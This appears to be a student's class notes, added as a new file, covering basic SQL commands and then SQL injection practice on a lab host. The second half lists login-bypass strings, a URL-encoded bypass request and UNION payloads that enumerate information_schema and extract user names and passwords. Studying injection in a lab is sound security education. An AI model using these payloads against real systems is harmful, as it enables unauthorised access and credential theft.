@@ -1,1 +1,94 @@
+Structured Query Language (SQL)
+	Standard Commands
+		SELECT			Extracts data from a database						### USE IN CLASS
+		UNION			Used to combine the result-set of two or more SELECT statements		### USE IN CLASS
+		USE			Selects the DB to use
+		UPDATE			Updates data in a database
+		DELETE			Deletes data from a database
+		INSERT INTO		Inserts new data into a database
+		CREATE DATABASE		Creates a new database
+		ALTER DATABASE		Modifies a database
+		CREATE TABLE		Creates a new table
+		ALTER TABLE		Modifies a table
+		DROP TABLE		Deletes a table
+		CREATE INDEX		Creates an index (search key)
+		DROP INDEX		Deletes an index
+		https://www.w3schools.com/SQL/sql_syntax.asp
+	End commands with a semicolon ;
+		show databases;
+		show tables from session;
+		show columns from session.car;
+		select year,name,cost from session.car;
+		select name,size,cost from session.tires UNION select name,size,cost from session.car;
+	
+	
+	EXTRA PRACTICE
+	https://sqlbolt.com/
+
+
+
+														                      DATABASES 
+													/		                 |		                       \
+												    TABLE	                        TABLE		                      TABLE
+												   /    \	                    /           \	                 /             \	
+											    COLUMNS      COLUMNS                COLUMNS       COLUMNS              COLUMNS          COLUMNS
+											   /      \      /     \               /     \         /    \               /     \          /    \
+											VALUE	 VALUE   VALUE	VALUE	     VALUE  VALUE   VALUE  VALUE	  VALUE  VALUE     VALUE VALUE
+
+
+
+
+	default databases
+		informational_schema
+			provides information about the sql server
+		performance_schema
+			metrics of how the sql databse is running
+		mysql
+	
+
+	table_schema = Databases
+	table_name = Tables
+	column_name = Columns
+
+
+
+Unsanitized vs Sanitized Fields
+	Unsanitized: input fields can be found using a Single Quote ⇒ '
+		Will return extraneous information
+		' closes a variable, to allow for additional statements/clauses
+		May show no errors or generic error (harder Injection)
+	Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
+	Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
+
+
+
+To USE SQL INJECTION
+	place in user field		tom' OR 1='1
+	place in password field		tom' OR 1='1
+	go To developer tool
+	Change to Raw
+	input raw after the .php and a ?	http://10.50.28.178/login.php?username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271
+
+
+
+
+To Look at databases you don't have direct access towards
+	Look at normal
+		try all of the things they have
+		try 					normal' OR 1='1
+		use UNION and select columns		Audi' Union SELECT 1,2,3,4,5 #
+		if it doesn't work keep going higher	
+		Looking for databases								****** Audi' Union SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #	******
+
+		Dive into Whatever we wanted		Audi' Union SELECT name,2,cost,type,color FROM session.car #
+			Be mindful of how many columns worked
+			Must be the exact amount
+							Audi' Union SELECT id,name,pass,3,4 FROM session.user #
+
+
+
+
+
+
+
 
